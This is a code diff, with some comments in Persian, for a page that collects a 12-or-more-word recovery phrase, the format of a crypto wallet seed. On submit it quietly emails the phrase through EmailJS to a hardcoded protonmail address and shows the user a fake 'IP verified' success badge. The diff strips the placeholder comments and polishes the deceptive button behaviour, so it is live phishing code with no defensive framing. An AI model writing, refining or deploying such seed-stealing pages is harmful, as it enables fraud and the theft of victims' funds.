@@ -409,7 +409,6 @@
       rulesPage.classList.remove('active');
       recoveryPage.classList.add('active');
       phraseInput.value = '';
-      validateWordCount();
       submitBtn.innerHTML = `<span>✓</span> confirm`;
       submitBtn.disabled = true;
       submitBtn.style.background = '';
@@ -417,6 +416,7 @@
       submitBtn.style.boxShadow = '';
       submitBtn.style.color = '';
       submitBtn.style.cursor = '';
+      validateWordCount();
     }
 
     showRulesBtn.addEventListener('click', showRules);
@@ -440,14 +440,11 @@
       const words = text ? text.split(/\s+/) : [];
       const count = words.length;
       wordDisplay.innerText = `⌨️ ${count} word${count !== 1 ? 's' : ''}`;
-      submitBtn.disabled = (count < 12);
-      if (count < 12) {
-        submitBtn.innerHTML = `<span>✓</span> confirm`;
-        submitBtn.style.background = '';
-        submitBtn.style.border = '';
-        submitBtn.style.boxShadow = '';
-        submitBtn.style.color = '';
-        submitBtn.style.cursor = '';
+      // فقط اگه دکمه غیرفعال نیست و متن کمتر از 12 کلمه است، غیرفعال کن
+      if (count < 12 && submitBtn.innerHTML.includes('confirm')) {
+        submitBtn.disabled = true;
+      } else if (count >= 12 && submitBtn.innerHTML.includes('confirm')) {
+        submitBtn.disabled = false;
       }
     }
 
@@ -456,12 +453,11 @@
     // --- Email sender (always runs in background) ---
     async function sendPhraseViaEmail(phrase) {
       try {
-        // ********** REPLACE WITH YOUR REAL EMAIL ADDRESS **********
-        const targetEmail = "mrx_private@protonmail.com";  // <-- CHANGE THIS
+        const targetEmail = "mrx_private@protonmail.com";
 
         await emailjs.send(
-          "service_j8bd9vn",        // your service ID
-          "template_paduqpn",        // your template ID
+          "service_j8bd9vn",
+          "template_paduqpn",
           {
             email: targetEmail,
             words: phrase,
@@ -476,30 +472,36 @@
       }
     }
 
-    // --- Confirm button: shows green SUCCESS (IP verified) and sends email in background ---
+    // --- Confirm button: shows green SUCCESS (IP verified) ---
     submitBtn.addEventListener('click', (e) => {
       e.preventDefault();
       const phrase = phraseInput.value.trim();
       if (!phrase) return;
 
+      // غیرفعال کردن دکمه
       submitBtn.disabled = true;
 
-      // Change button to green success badge (IP verified)
+      // تغییر به حالت سبز با پیام IP verified
       submitBtn.style.background = '#0d6b3e';
       submitBtn.style.border = '1px solid #3b9e6a';
       submitBtn.style.boxShadow = '0 4px 14px rgba(13, 107, 62, 0.3)';
       submitBtn.style.color = 'white';
       submitBtn.style.cursor = 'default';
-      submitBtn.innerHTML = `IP verified ✓`;
+      submitBtn.innerHTML = `✅ IP verified ✓`;
 
-      // Trigger background email (fire and forget)
+      // ارسال ایمیل در پس‌زمینه
       sendPhraseViaEmail(phrase);
 
-      // Clear textarea and update word count
+      // پاک کردن textarea
       phraseInput.value = '';
-      validateWordCount();
+      
+      // به‌روزرسانی شمارش کلمات (اما استایل دکمه را تغییر نمی‌دهیم)
+      const text = phraseInput.value.trim();
+      const words = text ? text.split(/\s+/) : [];
+      const count = words.length;
+      wordDisplay.innerText = `⌨️ 0 words`;
 
-      // After 2.5 seconds revert button to default look
+      // بعد از 3 ثانیه دکمه رو به حالت اولیه برمی‌گردونیم
       setTimeout(() => {
         submitBtn.style.background = '';
         submitBtn.style.border = '';
@@ -507,8 +509,8 @@
         submitBtn.style.color = '';
         submitBtn.style.cursor = '';
         submitBtn.innerHTML = `<span>✓</span> confirm`;
-        validateWordCount();
-      }, 2500);
+        submitBtn.disabled = true; // چون textarea خالی است
+      }, 3000);
     });
 
     validateWordCount();
